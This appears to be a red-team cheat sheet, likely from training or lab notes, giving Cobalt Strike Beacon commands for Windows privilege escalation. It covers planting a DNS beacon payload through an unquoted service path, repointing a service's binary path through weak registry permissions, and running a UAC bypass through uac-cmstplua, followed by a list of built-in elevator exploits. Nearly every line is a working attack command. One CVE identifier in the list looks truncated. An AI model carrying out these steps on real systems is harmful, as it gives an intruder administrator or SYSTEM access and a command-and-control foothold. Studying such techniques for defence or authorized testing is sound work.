

#### Unquoted Service Path

Enumerate available services
```powershell
sc_enum
```

> When abusing services, the dedicated svc.exe payloads must be used.

Query service and view permissions on file path
```powershell
sc_qc BadWindowsService

cacls "C:\Program Files\Bad Windows Service"
```

Upload DNS payload and rename to abuse unquoted service path
```powershell
cd C:\Program Files\Bad Windows Service

upload C:\Payloads\dns_x64.svc.exe

mv dns_x64.svc.exe Service.exe
```

Restart service
```powershell
sc_stop BadWindowsService
sc_start BadWindowsService
```

Checkin on new beacon
```powershell
checkin
```

Remove payload
```powershell
rm Service.exe
```

#### Service Registry Permissions

Enumerate permissions of the service's regsitry key and view current bin path
```powershell
powerpick Get-Acl -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService' | fl

sc_qc BadWindowsService
```

Stop the service
```powershell
sc_stop BadWindowsService
```

Upload payload to writeable directory
```powershell
cd C:\Windows\Tasks

upload C:\Payloads\dns_x64.svc.exe
```

Change bin path to the payload
```powershell
sc_config BadWindowsService C:\Windows\Tasks\dns_x64.svc.exe 0 2
```

Start the service
```powershell
sc_start BadWindowsService
```

Restore the bin path and remove payload
```powershell
sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2

rm  C:\Windows\Tasks\dns_x64.svc.exe
```



#### UAC Bypass

> Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.

Execute UAC bypasss
```powershell
runasadmin uac-cmstplua [ONE-LINER]
```

Connect to beacon
```powershell
connect localhost 1337
```

More can be found here
```powershell
beacon> runasadmin

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    ms16-032                        Secondary Logon Handle Privilege Escalation (CVE-2016-099)
    uac-cmstplua                    Bypass UAC with CMSTPLUA COM interface
    uac-eventvwr                    Bypass UAC with eventvwr.exe
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
    uac-wscript                     Bypass UAC with wscript.exe
```